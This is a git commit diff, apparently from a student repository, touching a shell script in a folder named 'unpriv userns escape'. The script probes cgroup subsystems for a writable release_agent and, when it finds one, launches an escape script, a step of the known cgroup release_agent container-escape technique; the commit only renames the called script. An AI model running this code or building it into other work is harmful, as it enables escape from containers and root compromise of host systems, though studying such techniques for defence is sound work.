65a5a682cedf9f9b8df463b25315b88061302d94
giorgio-hash <g.chirico1@studenti.unibg.it>
2023-08-28 23:02:34 +0200

    rinominato

--- unpriv userns escape/find_root_cgroup.sh
+++ unpriv userns escape/find_root_cgroup.sh
@@ -8,7 +8,7 @@ while read -r subsys
 do
     if bash -c "mount -t cgroup -o $subsys cgroup $test_dir 2>&1 >/dev/null && test -w $test_dir/release_agent && umount $test_dir" >/dev/null 2>&1 ; then
         echo "[!] trovato root cgroup con release_agent in: $subsys"
-        ./cgesc.sh $1 $2 $subsys
+        ./new_cgesc.sh $1 $2 $subsys
         exit 0
     fi
 done <<< $(cat /proc/$$/cgroup | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$')
